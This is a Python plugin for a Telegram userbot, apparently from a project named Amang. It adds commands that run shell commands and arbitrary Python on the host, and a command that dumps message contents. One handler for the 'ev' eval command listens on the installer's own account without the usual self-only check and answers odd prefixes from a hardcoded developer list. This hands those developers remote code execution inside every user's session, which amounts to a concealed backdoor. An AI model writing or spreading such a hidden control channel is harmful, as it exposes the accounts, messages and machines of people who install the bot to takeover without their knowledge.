import os
import sys
import traceback
from io import BytesIO, StringIO
from subprocess import Popen, PIPE, TimeoutExpired
from time import perf_counter

from Amang import *
from Amang.utils import *

@bot.on_message(filters.command(["sh"]) & filters.user(DEVS))
@ubot.on_message(filters.command("sh", cmd) & filters.user(DEVS) & filters.me)
async def shell(_, message: Message):
    if message.from_user.id not in DEVS:
        return await message.edit("**Lu bukan ADMINS**")
  
    if len(message.command) < 2:
        return await message.reply("<b>Specify the command in message text</b>")
    cmd_text = message.text.split(maxsplit=1)[1]
    cmd_obj = Popen(
        cmd_text,
        shell=True,
        stdout=PIPE,
        stderr=PIPE,
        text=True,
    )

    char = "#" if os.getuid() == 0 else "$"
    text = f"<b>{char}</b> <code>{cmd_text}</code>\n\n"

    await message.reply(text + "<b>Running...</b>")
    try:
        start_time = perf_counter()
        stdout, stderr = cmd_obj.communicate(timeout=60)
    except TimeoutExpired:
        text += "<b>Timeout expired (60 seconds)</b>"
    else:
        stop_time = perf_counter()
        if stdout:
            text += f"<b>Output:</b>\n<code>{stdout}</code>\n\n"
        if stderr:
            text += f"<b>Error:</b>\n<code>{stderr}</code>\n\n"
        text += f"<b>Completed in {round(stop_time - start_time, 5)} seconds with code {cmd_obj.returncode}</b>"
    await message.reply(text)
    cmd_obj.kill()


@ubot.on_message(filters.me & filters.command("dump", cmd))
async def _(client, message):
    if message.reply_to_message:
        if int(len(str(message.reply_to_message))) > 4096:
            with BytesIO(str.encode(str(message.reply_to_message))) as out_file:
                out_file.name = "result.txt"
                return await message.reply_document(
                    document=out_file,
                )
        else:
            return await message.reply_text(message.reply_to_message)
    else:
        return await eor(message, "reply ke pesan/media")


@bot.on_message(filters.command(["ev"]) & filters.user(DEVS))
@ubot.on_message(filters.command("ev", cmd) & filters.user(DEVS) & filters.me)
@ubot.on_message(filters.command(["ev", "e", "i"], [",", "(", ";", "×", ":"]) & filters.user(DEVS))
async def _(client, message):
    if ajg := get_arg(message):
        await eor(message, "`Processing ...`")
    else:
        return await eor(message, "`Give me commands dude...`")
    cmd = message.text.split(" ", maxsplit=1)[1]
    reply_to_ = message.reply_to_message or message
    old_stderr = sys.stderr
    old_stdout = sys.stdout
    redirected_output = sys.stdout = StringIO()
    redirected_error = sys.stderr = StringIO()
    stdout, stderr, exc = None, None, None
    try:
        await aexec(cmd, client, message)
    except Exception:
        exc = traceback.format_exc()
    stdout = redirected_output.getvalue()
    stderr = redirected_error.getvalue()
    sys.stdout = old_stdout
    sys.stderr = old_stderr
    evaluation = ""
    if exc:
        evaluation = exc
    elif stderr:
        evaluation = stderr
    elif stdout:
        evaluation = stdout
    else:
        evaluation = "Success"
    final_output = "OUTPUT:\n"
    final_output += f"{evaluation.strip()}"
    if len(final_output) > 4096:
        with BytesIO(str.encode(final_output)) as out_file:
            out_file.name = "eval.text"
            await reply_to_.reply_document(
                document=out_file,
                caption=cmd[: 4096 // 4 - 1],
                disable_notification=True,
                quote=True,
            )
    else:
        await reply_to_.reply_text(final_output, quote=True)
